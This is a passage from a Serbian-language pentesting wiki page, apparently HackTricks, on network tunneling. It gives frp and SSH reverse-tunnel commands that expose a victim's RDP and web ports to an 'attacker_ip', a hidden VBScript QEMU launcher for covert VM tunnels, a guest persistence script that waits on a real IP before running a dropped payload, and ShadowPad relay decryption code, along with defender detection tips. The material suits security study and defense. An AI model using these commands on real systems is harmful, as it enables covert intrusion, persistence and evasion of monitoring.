[`frp`](https://github.com/fatedier/frp) je Go reverse proxy koji podržava **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP koristi P2P hole punching, čiji uspeh zavisi od NAT-a. Počev od **v0.53.0**, može da radi kao **SSH Tunnel Gateway**, tako da ciljni host može da koristi standardni OpenSSH klijent bez `frpc` binary-ja.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasični reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korišćenje novog SSH gateway-a (bez frpc binarnog fajla)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Gornja komanda objavljuje žrtvin port **8080** kao **attacker_ip:9000** koristeći standardni OpenSSH klijent, dok `frps` obezbeđuje gateway.<sup>[[50]](#references)</sup>

## Covert VM-based Tunnels with QEMU

QEMU user-mode networking ne zahteva root ili administratorske privilegije za virtuelnu mrežu, a `-netdev user,hostfwd=...` preusmerava TCP, UDP ili UNIX konekcije sa hosta na guest.<sup>[[51]](#references)</sup> TrustedSec je dokumentovao Tiny Core QEMU VM i pokušaj reverse SSH tunela u incidentu u kojem bi EDR fokusiran na host mogao da propusti aktivnosti unutar guest-a.<sup>[[1]](#references)</sup>

### Brzi one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Komanda iznad pokreće gosta **Tiny Core Linux** sa 256 MiB memorije gosta i qcow2 slikom diska; slika diska nije disk u RAM-u.
• Port **2222/tcp** na Windows hostu transparentno se prosleđuje na **22/tcp** unutar gosta.
• Iz perspektive napadača, cilj jednostavno izlaže port 2222; svim paketima koji do njega stignu upravlja SSH server pokrenut u VM-u.

### Stealth pokretanje kroz VBScript

TrustedSec je u incidentu d navedenom iznad uočio pokretanja QEMU-a i Tiny Core slike pomoću VBS-a.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Pokretanje skripte pomoću `cscript.exe //B update.vbs` održava prozor skrivenim.<sup>[[1]](#references)</sup>

### Persistence unutar gosta

Incident d opisuje persistence u stateless Tiny Core guest-u kroz `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Drop-ujte payload u `/opt/123.out`
2. Dodajte u `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodajte `home/tc` i `opt` u `/opt/filetool.lst` kako bi payload bio upakovan u `mydata.tgz` pri gašenju.

### Razmatranja telemetrije

• Host i dalje izlaže QEMU proces, qcow2 image i svaki listener prosleđen sa hosta.
• Skeniranja procesa ograničena na host možda neće proveravati guest procese, ali virtualization nije garantovano izbegavanje; mrežna, QEMU i image telemetrija i dalje mogu da ga otkriju.<sup>[[1]](#references)[[51]](#references)</sup>

### Saveti za defendere

• Generišite upozorenje za **neočekivane QEMU/VirtualBox/KVM binarne fajlove** u putanjama u koje korisnik može da upisuje.
• Blokirajte outbound konekcije koje potiču od `qemu-system*.exe`.
• Tražite retke listening portove (2222, 10022, …) koji se bind-uju neposredno nakon pokretanja QEMU-a.

## IIS/HTTP.sys relay nodes preko `HttpAddUrl` (ShadowPad)

Check Point opisuje ShadowPad IIS modul kao mehanizam za pretvaranje kompromitovanih perimeter web servera u backdoor i relay nodes vezivanjem URL prefiksa kroz `HttpAddUrl`.<sup>[[3]](#references)</sup>

Isti izveštaj detaljno opisuje podrazumevane vrednosti, wildcard listeners, dešifrovanje paketa, relay queues i debug telemetriju sažete u nastavku.<sup>[[3]](#references)</sup>

* **Config defaults** – ako JSON config modula izostavi vrednosti, modul se vraća na uverljive IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Na taj način IIS odgovara na benigni saobraćaj uz odgovarajući branding.
* **Wildcard interception** – operatori prosleđuju listu URL prefiksa razdvojenih tačkom-zarezom (wildcards u host-u i path-u). Modul poziva `HttpAddUrl` za svaki unos, pa HTTP.sys usmerava zahteve koji se podudaraju zlonamernom handler-u; zahtevi koji se ne podudaraju vraćaju se na normalno IIS ponašanje.
* **Encrypted first packet** – prva dva bajta request body-ja sadrže seed za prilagođeni 32-bitni PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre parsiranja protokola:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – modul održava dve liste: „servers“ (upstream nodes) i „clients“ (downstream implants). Unosi se uklanjaju ako heartbeat ne stigne u roku od približno 30 sekundi. Kada nijedna lista nije prazna, modul uparuje prvi healthy server sa prvim healthy client-om i jednostavno prosleđuje bajtove između njihovih socket-a dok jedna strana ne zatvori konekciju.
* **Debug telemetry** – opcionalno logovanje beleži source IP, destination IP i ukupan broj prosleđenih bajtova za svako uparivanje. Istražitelji su koristili te tragove za rekonstrukciju ShadowPad mesh-a koji se prostirao kroz više žrtava.

---

## Ostali alati za proveru

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Skrivanje u senkama: Covert Tunnels putem QEMU virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relay network-a i unutrašnjeg funkcionisanja stealth offensive operation-a](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Zaobilaženje ograničenja firewall-a/IDS-a](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting u Metasploit-u](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit dokumentacija socks_proxy modula](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit dokumentacija autoroute modula](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY opcije komandne linije](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy komanda](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier dokumentacija](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel pregled](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
